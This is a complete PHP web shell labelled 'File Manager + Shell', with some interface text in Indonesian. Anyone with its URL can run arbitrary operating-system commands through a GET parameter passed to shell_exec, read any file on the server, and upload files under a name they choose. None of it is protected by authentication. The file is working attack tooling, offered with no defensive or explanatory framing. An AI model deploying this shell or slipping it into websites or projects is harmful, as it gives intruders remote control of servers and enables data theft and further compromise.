<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
if(isset($_GET['f'])) {
    highlight_file($_GET['f']);
}
if(isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']);
    echo "Upload berhasil.";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP Web Shell</title>
    <style>
        body { font-family: monospace; background: #111; color: #0f0; }
        input, textarea { background: #000; color: #0f0; border: 1px solid #0f0; width: 100%; }
        .box { width: 80%; margin: auto; padding: 10px; }
        a { color: cyan; text-decoration: none; }
    </style>
</head>
<body>
<div class="box">
    <h2>📂 File Manager + Shell</h2>

    <form method="GET">
        <label>Command:</label><br>
        <input type="text" name="cmd">
        <button type="submit">Run</button>
    </form>

    <form method="GET">
        <label>View File:</label><br>
        <input type="text" name="f">
        <button type="submit">View</button>
    </form>

    <form method="POST" enctype="multipart/form-data">
        <label>Upload File:</label><br>
        <input type="file" name="upload">
        <button type="submit">Upload</button>
    </form>

    <hr>
    <h3>🗂️ Direktori Saat Ini: <?php echo getcwd(); ?></h3>
    <ul>
        <?php
        $files = scandir('.');
        foreach ($files as $file) {
            if (is_dir($file)) {
                echo "<li>[DIR] <a href='?cmd=cd+$file'>$file</a></li>";
            } else {
                echo "<li><a href='?f=$file'>$file</a></li>";
            }
        }
        ?>
    </ul>
</div>
</body>
</html>